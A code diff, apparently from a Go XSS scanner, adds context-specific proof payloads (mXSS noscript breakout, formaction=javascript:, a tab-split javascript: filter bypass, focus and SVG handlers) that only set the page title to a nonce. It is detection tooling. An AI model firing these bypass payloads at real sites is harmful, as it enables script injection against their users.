@@ -554,6 +554,20 @@ func xssBrowserPayloadsForAnalysis(a *ReflectionAnalysis) []string {
 	svg := `<svg onload="top.document.title='%s'">`
 	doubleBreak := `"><img src=x onerror="top.document.title='%s'">`
 	singleBreak := `'><img src=x onerror="top.document.title='%s'">`
+	// mXSS: <noscript> is parsed as RAW TEXT only when the scripting flag is
+	// enabled (an ordinary browser tab, which chromedp is) — so the literal
+	// "</noscript>" sequence inside what looks like a quoted attribute value
+	// actually closes the tag early there, and everything after it becomes
+	// live markup (cure53/PortSwigger mXSS research). See xss_payloads.go for
+	// the matching browserless-ladder entry and why this is deliberately
+	// harmless (not a false positive) against a static parser.
+	mxss := `<noscript><p title="</noscript><img src=x onerror=&quot;top.document.title='%s'&quot;>">`
+	// formaction=javascript: is a real, documented filter-bypass technique for
+	// filters that block <script>/onXXX= but allow a form control's own
+	// formaction attribute; provable because xssProofPollExpression clicks any
+	// element whose formaction (or href) starts with javascript: and carries
+	// the nonce.
+	formactionHTML := `<form><button formaction="javascript:top.document.title='%s'">x</button></form>`
 	var out []string
 	switch a.Context {
 	case CtxHTMLText:
@@ -564,30 +578,62 @@ func xssBrowserPayloadsForAnalysis(a *ReflectionAnalysis) []string {
 			`<video><source onerror="top.document.title='%s'">`,
 			`<audio src=x onerror="top.document.title='%s'">`,
 			`<svg><animate attributeName=x dur=1s onbegin="top.document.title='%s'"></animate></svg>`,
+			`<svg><set attributeName=x to=y onbegin="top.document.title='%s'"></set></svg>`,
 			`<sVg/oNloAd="top.document.title='%s'">`,
 			`<input autofocus onfocus="top.document.title='%s'">`,
+			`<select autofocus onfocus="top.document.title='%s'"></select>`,
 			`<textarea autofocus onfocus="top.document.title='%s'"></textarea>`,
+			`<keygen autofocus onfocus="top.document.title='%s'">`,
+			`<style onload="top.document.title='%s'"></style>`,
+			`<marquee onstart="top.document.title='%s'">x</marquee>`,
+			`<div tabindex=1 autofocus onfocusin="top.document.title='%s'">x</div>`,
+			`<xss id=x tabindex=1 onfocusin="top.document.title='%s'"></xss>`,
+			`<object data="javascript:top.document.title='%s'"></object>`,
+			formactionHTML,
+			mxss,
 			`<iframe srcdoc="&lt;svg onload=&quot;top.document.title='%s'&quot;&gt;"></iframe>`,
 			`</script><script>top.document.title='%s'</script>`,
 		}
 	case CtxQuotedAttr, CtxURL:
 		if a.Context == CtxURL && a.URLScheme {
-			out = append(out, `javascript:top.document.title='%s'`)
+			// The URL spec strips ASCII tab/newline before scheme-checking, so
+			// this parses identically to a plain javascript: URI while evading a
+			// filter that regex-matches the literal string "javascript:".
+			out = append(out, `javascript:top.document.title='%s'`, "jav\tascript:top.document.title='%s'")
 		}
 		if a.Quote == '\'' {
-			out = append(out, singleBreak, `' autofocus onfocus="top.document.title='%s'" x='`)
+			out = append(out, singleBreak, `' autofocus onfocus="top.document.title='%s'" x='`,
+				`' formaction="javascript:top.document.title='%s'`)
 		} else {
-			out = append(out, doubleBreak, `" autofocus onfocus="top.document.title='%s'" x="`)
+			out = append(out, doubleBreak, `" autofocus onfocus="top.document.title='%s'" x="`,
+				`" formaction="javascript:top.document.title='%s'`)
 		}
 		out = append(out, `"><svg onload="top.document.title='%s'">`,
 			`"><details open ontoggle="top.document.title='%s'">`,
 			`"><sVg/oNloAd="top.document.title='%s'">`,
+			`"><style onload="top.document.title='%s'"></style>`,
+			`">`+formactionHTML,
 			`</script><script>top.document.title='%s'</script>`)
 	case CtxUnquotedAttr:
-		out = []string{` autofocus onfocus="top.document.title='%s'" x=`,
-			` tabindex=1 onfocus="top.document.title='%s'" autofocus x=`,
+		// A tag-name-position reflection (no real attribute captured) is not
+		// reliably focusable as an invented/unknown element, so autofocus may
+		// never fire there; the close-then-fresh-element vectors work
+		// regardless of what "tag" ends up being formed and go first when that
+		// is the likely case.
+		closeThenFresh := []string{
 			`><svg onload="top.document.title='%s'">`, `><img src=x onerror="top.document.title='%s'">`,
-			`><details open ontoggle="top.document.title='%s'">`}
+			`><details open ontoggle="top.document.title='%s'">`, `>` + formactionHTML,
+		}
+		focusBased := []string{
+			` autofocus onfocus="top.document.title='%s'" x=`,
+			` tabindex=1 onfocus="top.document.title='%s'" autofocus x=`,
+			` formaction="javascript:top.document.title='%s'" x=`,
+		}
+		if a.AttrName == "" {
+			out = append(append([]string{}, closeThenFresh...), focusBased...)
+		} else {
+			out = append(append([]string{}, focusBased...), closeThenFresh...)
+		}
 	case CtxEventHandler, CtxJSString:
 		if a.JSQuote == '\'' {
 			out = []string{`';top.document.title='%s';//`, `');top.document.title='%s';//`}
@@ -630,6 +676,8 @@ func xssBrowserPayloadsForAnalysis(a *ReflectionAnalysis) []string {
 			`&lt;svg onload=&quot;top.document.title='%s'&quot;&gt;`,
 			`&lt;img src=x onerror=&quot;top.document.title='%s'&quot;&gt;`,
 			`&lt;details open ontoggle=&quot;top.document.title='%s'&quot;&gt;`,
+			`&lt;style onload=&quot;top.document.title='%s'&quot;&gt;&lt;/style&gt;`,
+			`&lt;marquee onstart=&quot;top.document.title='%s'&quot;&gt;x&lt;/marquee&gt;`,
 			clean,
 		}
 		if a.Quote == '\'' {
@@ -1286,6 +1334,6 @@ func (b *browserXSSConfirmer) waitForExecution(ctx context.Context, nonce string
 func xssProofPollExpression(nonce string) string {
 	quoted := strconv.Quote(nonce)
 	return `(()=>{const n=` + quoted + `;if(document.title===n||window.` + xssProofResultKey + `===n)return true;` +
-		`for(const e of document.querySelectorAll('*')){for(const a of [...e.attributes]){if(!a.value.includes(n))continue;try{if(a.name==='href'&&a.value.toLowerCase().startsWith('javascript:'))e.click();else if(a.name==='autofocus')e.focus();else if(a.name.startsWith('on')){const t=a.name.slice(2);if(t==='focus')e.focus();else if(t==='click')e.click();else e.dispatchEvent(new Event(t,{bubbles:true}))}}catch(_){}}}` +
+		`for(const e of document.querySelectorAll('*')){for(const a of [...e.attributes]){if(!a.value.includes(n))continue;try{if((a.name==='href'||a.name==='formaction')&&a.value.toLowerCase().startsWith('javascript:'))e.click();else if(a.name==='autofocus')e.focus();else if(a.name.startsWith('on')){const t=a.name.slice(2);if(t==='focus')e.focus();else if(t==='click')e.click();else e.dispatchEvent(new Event(t,{bubbles:true}))}}catch(_){}}}` +
 		`return document.title===n||window.` + xssProofResultKey + `===n})()`
 }
